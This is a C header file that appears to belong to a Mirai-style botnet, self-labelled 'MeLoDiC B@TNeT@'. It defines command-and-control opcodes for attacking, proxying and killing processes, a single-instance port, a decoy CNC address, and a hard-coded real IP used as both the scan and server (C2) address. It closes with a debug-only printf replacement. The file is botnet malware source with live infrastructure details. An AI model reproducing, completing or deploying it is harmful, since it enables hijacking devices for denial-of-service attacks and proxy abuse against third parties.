#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define STDIN   0
#define STDOUT  1
#define STDERR  2

#define FALSE   0
#define TRUE    1
typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define SINGLE_INSTANCE_PORT 48318

#define FAKE_CNC_ADDR (int)inet_addr((const char*)"MeLoDiC B@TNeT@");
#define FAKE_CNC_PORT   80

#define CNC_OP_PING         0x00
#define CNC_OP_KILLSELF     0x10
#define CNC_OP_KILLATTKS    0x20
#define CNC_OP_PROXY        0x30
#define CNC_OP_ATTACK       0x40

#define SCANIP (int)inet_addr((const char*)"37.49.226.210");
#define SERVIP (int)inet_addr((const char*)"37.49.226.210");


ipv4_t LOCAL_ADDR;

#ifdef DEBUG
static char *outptr;
static void xputc(char c)
{
	if (outptr) {
		*outptr++ = (unsigned char)c;
		return;
	} else {
		write(0, &c, 1);
	}
}

static void xputs(const char *str)
{
	while (*str)
		xputc(*str++);
}

static void xvprintf(const char *fmt, va_list arp)
{
	unsigned int r, i, j, w, f;
	unsigned long v;
	char s[16], c, d, *p;
	for (;;) {
		c = *fmt++;					
		if (!c) break;				
		if (c != '%') {				
			xputc(c); continue;
		}
		f = 0;
		c = *fmt++;					
		if (c == '0') {				
			f = 1; c = *fmt++;
		} else {
			if (c == '-') {			
				f = 2; c = *fmt++;
			}
		}
		for (w = 0; c >= '0' && c <= '9'; c = *fmt++)	
			w = w * 10 + c - '0';
		if (c == 'l' || c == 'L') {
			f |= 4; c = *fmt++;
		}
		if (!c) break;				
		d = c;
		//toupper
		if (d >= 'a') d -= 0x20;
		switch (d) {				
		case 'S' :					
			p = va_arg(arp, char*);
			for (j = 0; p[j]; j++) ;
			while (!(f & 2) && j++ < w) xputc(' ');
			xputs(p);
			while (j++ < w) xputc(' ');
			continue;
		case 'C' :					
			xputc((char)va_arg(arp, int)); continue;
		case 'B' :					
			r = 2; break;
		case 'O' :					
			r = 8; break;
		case 'D' :					
		case 'U' :					
			r = 10; break;
		case 'X' :					
			r = 16; break;
		default:					
			xputc(c); continue;
		}


		v = (f & 4) ? va_arg(arp, long) : ((d == 'D') ? (long)va_arg(arp, int) : (long)va_arg(arp, unsigned int));
		if (d == 'D' && (v & 0x80000000)) {
			v = 0 - v;
			f |= 8;
		}
		i = 0;
		do {
			d = (char)(v % r); v /= r;
			if (d > 9) d += (c == 'x') ? 0x27 : 0x07;
			s[i++] = d + '0';
		} while (v && i < sizeof(s));
		if (f & 8) s[i++] = '-';
		j = i; d = (f & 1) ? '0' : ' ';
		while (!(f & 2) && j++ < w) xputc(d);
		do xputc(s[--i]); while(i);
		while (j++ < w) xputc(' ');
	}
}

static void xprintf(const char *fmt, ...)
{
	va_list arp;
	va_start(arp, fmt);
	xvprintf(fmt, arp);
	va_end(arp);
}
#define printf xprintf

#endif

